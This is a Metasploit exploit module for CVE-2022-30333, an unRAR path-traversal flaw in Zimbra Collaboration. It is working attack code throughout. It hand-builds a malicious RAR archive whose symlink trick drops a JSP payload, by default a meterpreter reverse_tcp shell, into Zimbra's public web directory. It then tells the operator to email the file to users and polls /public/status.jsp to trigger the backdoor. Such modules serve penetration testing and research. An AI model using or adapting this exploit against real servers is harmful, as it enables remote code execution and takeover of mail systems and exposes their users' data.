##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => "UnRAR Path Traversal in Zimbra (CVE-2022-30333)",
      'Description'    => %q{
        This module creates a RAR file that exploits CVE-2022-30333, which is a
        path-traversal vulnerability in unRAR that can extract an arbitrary file
        to an arbitrary location on a Linux system.

        The core issue is that when a symbolic link is unRAR'ed, Windows
        symbolic links are not properly validated on Linux systems and can
        therefore write a symbolic link that points anywhere on the filesystem.
        If a second file in the archive has the same name, it will be written
        to the symbolic link path.

        The Zimbra target creates a RAR file that can exploit the following
        versions of Zimbra Collaboration:

        * Zimbra Collaboration 9.0.0 Patch 24 (and earlier)
        * Zimbra Collaboration 8.8.15 Patch 31 (and earlier)
      },
      'Author'         =>
        [
          'Simon Scannell', # Discovery / initial disclosure (via Sonar)
          'Ron Bowes', # Analysis, PoC, and module
        ],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2022-30333'],
        ['URL', 'https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/'],
        ['URL', 'https://github.com/pmachapman/unrar/commit/22b52431a0581ab5d687747b65662f825ec03946'],
        ['URL', 'https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P25'],
        ['URL', 'https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/P32'],
      ],
      'Platform'       => 'linux',
      'Arch'           => [ARCH_X86, ARCH_X64],
      'Payload'        =>
        {
          # The RAR file has 4096 bytes of room. The payload is hex-encoded, and
          # the template is ~1624 bytes long (with worst possible RNG).
          'Space' => (4096 / 2) - 1700,
        },
      'Targets'        =>
        [
          [
            'Zimbra Collaboration Suite',
            {
              'Arch' => ARCH_X64,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',

                # TODO: It might be nice to randomize the filename?
                'TARGET_PATH' => '../../../../../../../../../../../../opt/zimbra/jetty_base/webapps/zimbra/public/status.jsp',
                'DisablePayloadHandler' => false,
                'RPORT' => 443,
                'SSL' => true,
              }
            },
          ],
          [
            'Generic RAR file',
            {
              'Arch' => [ARCH_X86, ARCH_X64, ARCH_JAVA],
              'DefaultOptions' => {
                'DisablePayloadHandler' => true,
                'TARGET_PATH' => '',
                'AllowNoCleanup' => true,
              }
            }
          ],
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => false,
      'DisclosureDate' => '2022-06-28',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'Reliability' => [REPEATABLE_SESSION],
        'SideEffects' => [IOC_IN_LOGS]
      }
    ))

    register_options(
      [
        OptString.new('FILENAME', [ false, 'The file name.', 'payload.rar']),
        OptString.new('TARGET_PATH', [ false, 'The location the payload should extract to (can, and should, contain path traversal characters - "../../").', nil])
      ])

    register_advanced_options(
      [
        # Took this from multi/handler
        OptInt.new("ListenerTimeout", [ false, "The maximum number of seconds to wait for new sessions", 0 ])
      ]
    )
  end

  def encode_as_rar(target_path, data)
    unless target_path.length < 0x68
      fail_with(Failure::BadConfig, "The configured TARGET_PATH is too long (max length: 103 characters)")
    end

    unless data.length < 4096
      fail_with(Failure::BadConfig, "The payload is too long (max length: 4096 bytes, it was #{ data.length })")
    end

    # Null terminate the path, pad with NUL bytes, and invert the slashes
    symlink_target = (target_path + "\0").gsub('/', '\\').ljust(0x68, "\0")
    symlink_name = rand_text_alpha(12)

    # NULL-Pad the data as well
    data = data.ljust(4096, "\0")

    # Build a RAR file from pieces, filling in the blanks with our payloads.
    # The RAR format is non-free (and complex), so this is the easiest way to
    # build a payload file
    "\x52\x61\x72\x21\x1a\x07\x01\x00\xf3\xe1\x82\xeb\x0b\x01\x05\x07\x00\x06\x01\x01\x80\x80\x80\x00\x9e\xe2\xc4\xf5\x94\x01\x02\x03\x78\x00\x04\x00\xa0\x08\x00\x00\x00\x00\x80\x00\x00\x0c" +
      symlink_name + # Symlink filename
      "\x0a\x03\x02\xae\xf0\x37\x1c\x91\x98\xd8\x01\x6c\x05\x02\x00\x68" +
      symlink_target +
      "\xf3\xa1\x93\x68\x28\x02\x03\x0b\x80\x20\x04\x80\x20\x20" +
      [Zlib::crc32(data)].pack('V') +
      "\x80\x00\x00\x0c" +
      symlink_name + # Data filename (same as symlink to overwrite it)
      "\x0a\x03\x02\x00\x36\xe3\x00\x91\x98\xd8\x01" +
      data +
      "\x1d\x77\x56\x51\x03\x05\x04\x00"
  end

  def exploit
    data = ''
    payload_jsp = Msf::Util::EXE.to_jsp(generate_payload_exe)

    file_create(encode_as_rar(datastore['TARGET_PATH'], payload_jsp))

    # If it's Zimbra, try to trigger the payload
    if target.name == 'Zimbra Collaboration Suite'
      register_file_for_cleanup(datastore['TARGET_PATH'])
      print_good("Go ahead and email that file to anyone on the Zimbra server! We'll wait")

      # This loop is mostly from `multi/handler`
      stime = Time.now.to_f
      timeout = datastore['ListenerTimeout'].to_i
      loop do
        break if session_created?
        break if timeout > 0 && (stime + timeout < Time.now.to_f)

        print_status("Trying to trigger the backdoor...")

        res = send_request_cgi(
          'method' => 'GET',
          'uri' => normalize_uri("/public/status.jsp"),
        )

        Rex::ThreadSafe.sleep(5)
      end
    end
  end
end
